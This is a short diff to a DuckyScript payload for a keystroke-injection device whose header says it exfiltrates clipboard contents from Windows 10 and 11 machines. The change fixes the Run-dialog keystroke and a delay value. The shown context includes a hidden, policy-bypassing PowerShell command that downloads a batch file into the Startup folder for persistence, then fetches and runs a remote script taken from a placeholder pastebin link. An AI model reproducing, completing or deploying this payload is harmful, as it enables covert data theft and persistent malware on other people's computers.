@@ -7,8 +7,8 @@ REM     Description: This payload is meant to exfiltrate whatever is copied to t
 REM     Target: Windows 10, 11
 
 DELAY 2000
-GUI
-DELAY
+GUI r
+DELAY 200
 STRING powershell -w h -NoP -NonI -Ep Bypass "echo (iwr PASTEBIN LINK FOR BAT).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1"" 
 ENTER
 
